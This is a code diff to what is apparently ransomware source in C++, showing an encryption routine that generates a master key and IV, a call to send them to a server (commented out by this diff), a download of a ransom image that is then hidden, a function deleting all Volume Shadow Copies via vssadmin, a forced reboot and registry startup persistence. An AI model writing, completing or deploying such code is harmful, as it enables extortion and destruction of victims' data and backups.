@@ -4,7 +4,7 @@
 #define LIMIT_CPU_FAIL 0
 
 #define VM 0
-#if 1
+
 using namespace boost::filesystem;
 using std::string;
 
@@ -30,6 +30,7 @@ int encryption_main( bool fromStart) {
 	PBYTE masterIV = nullptr, masterKey = nullptr;
 	string path = ROOT_DIR;
 	string pathToImage = get_path_to_jpeg();
+	RsaEncryptor Enc;
 #if VM
 	RegisterProgram();
 #endif
@@ -42,7 +43,7 @@ int encryption_main( bool fromStart) {
 	PBYTE id = nullptr;
 	HANDLE hCurrentProcess = nullptr;
 	HANDLE hJob = nullptr;
-	std::vector<string> processed;
+	vector<string> processed;
 	string fileRead;
 	/* let's begin*/
 	Status status = generateKeyAndIV(&masterIV, &masterKey);
@@ -59,11 +60,12 @@ int encryption_main( bool fromStart) {
 	{
 		goto CLEAN;
 	}
-	status = sendIVAndKeyToServer(masterIV,masterKey,id);
+	/*status = sendIVAndKeyToServer(masterIV,masterKey,id);
 	if(!NT_SUCCESS(status))
 	{
 		goto CLEAN;
-	}
+	}*/
+
 	status = LimitCPU(hCurrentProcess, hJob);
 	if(LIMIT_CPU_FAIL == status)
 	{
@@ -118,7 +120,6 @@ int encryption_main( bool fromStart) {
 	IDFile << fileRead;
 	IDFile.close();
 
-	
 	download_jpeg(pathToImage, R"(https://i.redd.it/ep77fc6dceey.jpg)");
 	makeFileHidden(pathToImage);
 	changeHiddenFileState(true);
@@ -182,6 +183,7 @@ void makeFileHidden(string path)
 	DWORD attributes = GetFileAttributes(path.c_str());
 	SetFileAttributes(path.c_str(), attributes + FILE_ATTRIBUTE_HIDDEN);
 }
+
 void destroyVSS()
 {
 	ShellExecute(nullptr, "open", "C:\\Windows\\system32\\vssadmin.exe Delete Shadows /All /Quiet", nullptr, nullptr, 0);
@@ -474,8 +476,6 @@ void doRestart()
 	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
 }
 
-
-
 BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
 {
 	HKEY hKey = NULL;
@@ -563,4 +563,3 @@ void RegisterProgram()
 //void send() {
 //
 //}
-#endif
